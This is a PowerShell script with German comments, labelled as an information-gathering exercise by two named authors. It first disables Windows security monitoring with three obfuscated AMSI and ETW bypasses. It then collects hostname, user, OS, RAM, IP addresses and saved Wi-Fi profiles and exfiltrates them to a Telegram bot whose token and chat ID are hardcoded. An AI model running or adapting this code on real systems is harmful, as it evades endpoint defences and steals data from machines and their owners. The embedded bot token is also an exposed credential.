# ============================================================
#  W02a.2 - Information Gathering
#  Autoren: Raphael Bleier, Joachim Lugger
#  Exfiltration: Telegram Bot
# ============================================================

$BOT_TOKEN = "8666929583:AAHXKuc4gV1n6JMYQeoPxw3uby08GVivvgo"
$CHAT_ID   = "1780237079"

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# AMSI + ETW: 3-Layer-Bypass
# L1: AMSI Write-Raid (kein VirtualProtect - IAT-Patch via ReadProcessMemory)
try {
    $n="WR$(Get-Random)"
    $s=@"
using System;using System.Runtime.CompilerServices;using System.Runtime.InteropServices;
public class $n{
[DllImport("kernel32.dll")]public static extern bool ReadProcessMemory(IntPtr h,IntPtr a,byte[]b,uint s,ref uint r);
[DllImport("kernel32.dll")]public static extern IntPtr GetCurrentProcess();
[DllImport("kernel32",CharSet=CharSet.Ansi,ExactSpelling=true,SetLastError=true)]public static extern IntPtr GetProcAddress(IntPtr h,string p);
[DllImport("kernel32.dll",CharSet=CharSet.Auto)]public static extern IntPtr GetModuleHandle([MarshalAs(UnmanagedType.LPWStr)]string m);
[MethodImpl(MethodImplOptions.NoOptimization|MethodImplOptions.NoInlining)]public static int D(){return 1;}
}
"@
    $T=(Add-Type $s -PassThru -ErrorAction Stop)[0]
    $dl=[Text.Encoding]::ASCII.GetString([byte[]](97,109,115,105,46,100,108,108))
    $fn=[Text.Encoding]::ASCII.GetString([byte[]](65,109,115,105,83,99,97,110,66,117,102,102,101,114))
    [IntPtr]$fa=$T::GetProcAddress($T::GetModuleHandle($dl),$fn)
    $asm=[appdomain]::CurrentDomain.GetAssemblies()|?{$_.Location-and($x=$_.FullName.Split(',')[0])-and $x.StartsWith('S')-and $x.EndsWith('n')-and $x.Length-eq 28}|Select -First 1
    $ut=$asm.GetTypes()|?{$_.Name-and $_.Name.StartsWith('A')-and $_.Name.EndsWith('s')-and $_.Name.Length-eq 9}|Select -First 1
    $mt=$ut.GetMethods([Reflection.BindingFlags]'Static,NonPublic')|?{$_.Name-and $_.Name.StartsWith('S')-and $_.Name.EndsWith('t')-and $_.Name.Length-eq 11}|Select -First 1
    [IntPtr]$mp=$mt.MethodHandle.GetFunctionPointer()
    $hp=$T::GetCurrentProcess();$r=[uint32]0;$pt=[IntPtr]::Zero;$ok=$false
    for($j=0x50000;$j-lt 0x2000000-and-not $ok;$j+=0x50000){
        [IntPtr]$ba=[Int64]$mp-$j;$b=[byte[]]::new(0x50000)
        if($T::ReadProcessMemory($hp,$ba,$b,0x50000,[ref]$r)){
            for($i=0;$i-lt $b.Length-8;$i++){if([IntPtr][BitConverter]::ToInt64($b,$i)-eq $fa){$pt=[Int64]$ba+$i;$ok=$true;break}}
        }
    }
    if($ok){[IntPtr]$dp=$T.GetMethod('D').MethodHandle.GetFunctionPointer();[Runtime.InteropServices.Marshal]::Copy([IntPtr[]]($dp),0,$pt,1)}
} catch {}
# L2: amsiInitFailed (Reflection-Fallback)
try {
    $u=[Ref].Assembly.GetType([Text.Encoding]::ASCII.GetString([byte[]](83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,65,109,115,105,85,116,105,108,115)))
    $u.GetField([Text.Encoding]::ASCII.GetString([byte[]](97,109,115,105,73,110,105,116,70,97,105,108,101,100)),'NonPublic,Static').SetValue($null,$true)
} catch {}
# L3: ETW / Script-Block-Logging deaktivieren
try {
    $ep=[Ref].Assembly.GetType([Text.Encoding]::ASCII.GetString([byte[]](83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,84,114,97,99,105,110,103,46,80,83,69,116,119,76,111,103,80,114,111,118,105,100,101,114)))
    $fv=$ep.GetField([Text.Encoding]::ASCII.GetString([byte[]](101,116,119,80,114,111,118,105,100,101,114)),'NonPublic,Static').GetValue($null)
    [System.Diagnostics.Eventing.EventProvider].GetField([Text.Encoding]::ASCII.GetString([byte[]](109,95,101,110,97,98,108,101,100)),'NonPublic,Instance').SetValue($fv,0)
} catch {}

function Send-TgMessage {
    param([string]$Text)
    try {
        for ($i = 0; $i -lt $Text.Length; $i += 4000) {
            $chunk = $Text.Substring($i, [Math]::Min(4000, $Text.Length - $i))
            Invoke-RestMethod -Uri "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" `
                -Method POST -Body @{ chat_id = $CHAT_ID; text = $chunk } | Out-Null
            if (($Text.Length - $i) -gt 4000) { Start-Sleep -Milliseconds 500 }
        }
    } catch { }
}

function Send-TgFile {
    param([string]$Filename, [string]$Content, [string]$Caption = "")
    try {
        Add-Type -AssemblyName System.Net.Http -ErrorAction Stop
        $http = [System.Net.Http.HttpClient]::new()
        $form = [System.Net.Http.MultipartFormDataContent]::new()
        $form.Add([System.Net.Http.StringContent]::new($CHAT_ID),  "chat_id")
        $form.Add([System.Net.Http.StringContent]::new($Caption),  "caption")
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($Content)
        $fc    = [System.Net.Http.ByteArrayContent]::new($bytes)
        $fc.Headers.Add("Content-Type", "text/plain; charset=utf-8")
        $form.Add($fc, "document", $Filename)
        $http.PostAsync("https://api.telegram.org/bot$BOT_TOKEN/sendDocument", $form).GetAwaiter().GetResult() | Out-Null
        $http.Dispose()
    } catch { }
}

# ── Recon ────────────────────────────────────────────────────

Send-TgMessage "[INFO GATHERING] $env:COMPUTERNAME\$env:USERNAME gestartet"

# OS + RAM - prefer CimInstance, fall back to WmiObject
try   { $os  = (Get-CimInstance Win32_OperatingSystem).Caption }
catch { $os  = (Get-WmiObject   Win32_OperatingSystem).Caption }
try   { $ram = [math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory/1GB, 2) }
catch { $ram = [math]::Round((Get-WmiObject   Win32_ComputerSystem).TotalPhysicalMemory/1GB, 2) }

# IPs - NetIPAddress module may not be loaded in hidden sessions
try {
    $ips = (Get-NetIPAddress -AddressFamily IPv4 |
            Where-Object { $_.IPAddress -notlike '127*' } |
            Select-Object -ExpandProperty IPAddress) -join ', '
} catch {
    $ips = (ipconfig 2>&1 |
            Select-String 'IPv4' |
            ForEach-Object { ($_.ToString() -split ':')[-1].Trim() }) -join ', '
}

$wifi = (netsh wlan show profiles 2>&1) -join "`n"

$report = @"
=== INFO GATHERING | $(Get-Date -Format 'yyyy-MM-dd HH:mm') ===
Hostname : $env:COMPUTERNAME
User     : $env:USERNAME ($env:USERDOMAIN)
OS       : $os ($env:PROCESSOR_ARCHITECTURE)
RAM (GB) : $ram
IP(s)    : $ips

=== WIFI PROFILES ===
$wifi
"@

Send-TgFile -Filename "info_$(Get-Date -Format 'yyyyMMdd_HHmm').txt" `
            -Content $report `
            -Caption "Info Gathering - $env:COMPUTERNAME"
